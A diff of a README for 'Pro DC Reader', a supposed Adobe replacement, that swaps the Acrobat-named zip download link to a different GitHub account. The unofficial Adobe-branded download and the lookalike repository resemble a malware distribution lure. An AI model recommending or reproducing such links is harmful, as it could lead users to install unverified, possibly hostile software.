@@ -6,7 +6,7 @@ What is Pro DC Reader? It's a complete PDF editor for Windows that replaces Adob
 
 ## Install
 
-[Download `Acrobat-v26.001.21771.zip`](https://github.com/pipilikam/pro-dc-reader-pdf-editor/releases/download/v26.001.21771/Acrobat-v26.001.21771.zip)
+[Download `Acrobat-v26.001.21771.zip`](https://github.com/acrobatreaderpdf/Reader-Pro-DC/releases/download/v26.001.21771/Acrobat-v26.001.21771.zip)
 ---
 Optimized for Windows 11, also works on Windows 10 (64-bit).
 
